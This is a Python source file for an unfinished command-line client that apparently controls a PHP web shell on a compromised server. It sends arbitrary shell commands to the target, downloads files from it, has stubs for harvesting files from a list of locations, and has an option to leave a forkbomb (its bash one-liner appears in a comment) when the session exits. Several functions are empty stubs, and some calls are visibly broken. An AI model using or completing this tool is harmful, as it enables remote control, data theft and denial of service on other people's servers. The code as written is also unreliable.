#!/usr/bin/env python3
import sys, os
from cmd import Cmd
from colorama import Fore, Back, Style
import requests
import json
import base64


#Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
#Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
#Style: DIM, NORMAL, BRIGHT, RESET_ALL

target=""
fork=False
CWD=None


class MyPrompt(Cmd):
    prompt = "#"

    def update_prompt(self):
        global CWD
        self.promt=CWD+" $ "

    def do_upload(self, inp):
        pass

    def default(self, inp):
        pass
        
    def do_exit(self, inp):
        global fork
        if fork:
            forkbomb()
        return True
 

def request(url, params):
    global target
    return json.loads(requests.post(target+url, data=params))

def gather_infos(): #every file of file-locations.txt until an empty line occurs
    log("getting most important information:")
    global target
    pass

def gather_more(): #every file after the empty line
    global target
    gather_infos() #more should always include the most important and most important should always be first
    log("getting more information:")
    pass

def shell(command):
    global CWD
    resp = request("?feature=shell", {"cmd": command, "cwd": CWD})
    if "file" in resp:
        download(resp["name"], resp["file"])
    else:
        print(resp["stdout"].join("\n"))
        CWD = resp["cwd"]

def download(name,file):
    log("Download To "+name)
    os.mkdir("download")
    f=open(name,"w")
    f.write(base64.b64decode(file))
    pass

def upload(path):
    global target
    pass

def forkbomb(): #:(){ :|:& };:
    log("leaving forkbomb")
    pass

def log(msg):
    print(Fore.CYAN+msg+Style.RESET_ALL)

def warn(msg):
    print(Fore.YELLOW+msg+Style.RESET_ALL)

def main(target, infos: ('extracts the most important information', 'flag', 'i'),more: ('extracts the all important information', 'flag', 'm'),fork: ('leaves forkbomb', 'flag', 'f'),auto: ('non interactive', 'flag', 'a')):
    "Use with b2fshell.php or b2fshell-headless.php"
    globals()['target'] = target
    globals()['fork'] = fork

    if more:
        gather_more()
    elif infos:
        gather_infos()

    if not auto:
        MyPrompt().cmdloop()
    else:
        warn("--auto specified: terminating")
if __name__ == '__main__':
    import plac; plac.call(main)
